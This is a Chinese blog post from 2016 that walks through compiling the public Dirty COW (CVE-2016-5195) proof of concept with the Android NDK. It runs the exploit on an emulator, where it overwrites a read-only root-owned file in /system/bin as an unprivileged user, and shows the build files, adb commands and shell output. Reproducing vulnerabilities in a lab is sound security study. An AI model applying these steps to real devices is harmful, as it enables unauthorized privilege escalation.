---
title: "Android dirtycow(CVE-2016-5195) 提权漏洞测试"
layout: post
date: 2016-10-26 14:58
headerImage: false
tag:
- dirtycow
- android
- linux
- privilge escalation
blog: true
star: false
author: b1ngz
description: 

---

# 0x01 概述

---

前两天在看雪上看到一篇在android上测试dirtycow漏洞的文章 - [【分享】CVE-2016-5195 dirtycow linux内核漏洞测试](http://bbs.pediy.com/showthread.php?p=1449450#post1449450)，里面测试了 [POC]( https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c
)，因为没有详细的步骤，看完有点蒙bi，决定自己动手测试一下，这里记录一下过程。

# 0x02 环境安装

---

测试使用android虚拟机，IDE用的 `android studio 2.2.2`，安装了`NDK` 等相关工具，详细可以参考 [Getting Started with the NDK](https://developer.android.com/ndk/guides/index.html)

![](/assets/images/android-dirtycow/1.png)

`SDK Platforms` 的话可以任选，这里安装了 `5.0`, `6.0`, `7.0`

![](/assets/images/android-dirtycow/2.png)

安装的时候需要翻墙～


# 0x03 POC编译

---

之前没有用过 `NDK`，搜了搜，找到篇文章 [using-c-and-c-code-in-an-android-app-with-the-ndk/](https://www.sitepoint.com/using-c-and-c-code-in-an-android-app-with-the-ndk/)，import了一个 HelloWorld 程序，这里可以通过welcome界面导入 `Hello JNI` 项目，

![](/assets/images/android-dirtycow/3.png)

不过网络不好会提示failed，也可以选择从 github 上拉取，然后手动导入

```
git clone https://github.com/googlesamples/android-ndk
```

导入后，默认的布局如下

![](/assets/images/android-dirtycow/4.png)

接着根据 [three-ways-to-use-android-ndk-cross-compiler](http://zwyuan.github.io/2015/12/22/three-ways-to-use-android-ndk-cross-compiler/) 来编译 POC，文中介绍了3种，这里选择第一种 `ndk-build`

切换到 `Project` 视图，点开 `app -> src -> main`，新建 jni 目录，然后在目录下新建三个文件

![](/assets/images/android-dirtycow/5.png)

**dirtycow.c:** [POC代码](https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c)


**Android.mk:** 编译相关的配置，如源文件名，编译后的文件名等，具体介绍可以参考 [android_mk](https://developer.android.com/ndk/guides/android_mk.html)

```
LOCAL_PATH := $(call my-dir)

include $(CLEAR_VARS)

LOCAL_MODULE    := dirtycow
LOCAL_SRC_FILES := dirtycow.c

include $(BUILD_EXECUTABLE)
```

**Application.mk:** 编译的架构等相关配置. 参考 [application_mk](https://developer.android.com/ndk/guides/application_mk.html)

```
# Filename: Application.mk
APP_ABI := x86
```
因为之前创建过的android虚拟机是基于`x86`架构的(跑arm的很慢)，所以 `APP_ABI` 的值设置为 `x86`，其他架构可以到 [application_mk](https://developer.android.com/ndk/guides/application_mk.html) 的 `APP_ABI` 部分查询

![](/assets/images/android-dirtycow/6.png)

然后命令行进入 `jni` 目录，使用 `ndk-build` 来编译c代码，这里需要将`ndk-build` 所在目录加入到 `PATH` 环境变量中，具体位置在 `SDK` 目录下的 `ndk-bundle`，比如我的为 `/Users/b1ng/Library/Android/sdk/ndk-bundle/`

执行完后，会在 `libs/x86` 目录下生成编译后的可执行文件

然后我们通过 adb 命令将文件 push 到设备里

```
➜  x86 git:(master) ✗ adb devices
List of devices attached
emulator-5554	device

➜  x86 git:(master) ✗ adb push ./dirtycow /data/local/tmp/dirtycow
[100%] /data/local/tmp/dirtycow
```

然后adb shell进入命令行，查看我们的poc可执行文件

```
➜  x86 git:(master) ✗ adb -s emulator-5554 shell
root@generic_x86:/ # ll /data/local/tmp/dirtycow
-rwxrwxrwx root     root         5532 2016-10-26 04:12 dirtycow
root@generic_x86:/ #

```

接着我们在 `/system/bin` 目录下创建一个普通用户没有写权限的文件，因为默认的 `/system` 目录是只读的，所以需要 `remount /system`

```
root@generic_x86:/system/bin # echo origin > test
/system/bin/sh: can't create test: Read-only file system
1|root@generic_x86:/system/bin # mount -o rw,remount /system
root@generic_x86:/system/bin # echo origin > test
root@generic_x86:/system/bin # ll test
-rw-rw-rw- root     root            7 2016-10-26 04:23 test
root@generic_x86:/system/bin # cat test
origin
```

修改权限让普通用户没有写权限

```
root@generic_x86:/system/bin # chmod 444 test
root@generic_x86:/system/bin # ll test
-r--r--r-- root     root            7 2016-10-26 04:23 test
```

切换普通用户，执行POC，修改文件内容，执行完一会就可以停掉，不然会一直循环

```
root@generic_x86:/system/bin # su shell
root@generic_x86:/system/bin $ id
uid=2000(shell) gid=2000(shell)
root@generic_x86:/system/bin $ echo 123 > test
sh: can't create test: Permission denied
1|root@generic_x86:/system/bin $ cat test
origin
root@generic_x86:/system/bin $ /data/local/tmp/dirtycow  test modify
mmap b7608000

^C
130|root@generic_x86:/system/bin $ cat test
modify
```

测试成功


# 0x04 参考

---

- [Getting Started with the NDK](https://developer.android.com/ndk/guides/index.html)
- [three-ways-to-use-android-ndk-cross-compiler](http://zwyuan.github.io/2015/12/22/three-ways-to-use-android-ndk-cross-compiler/)






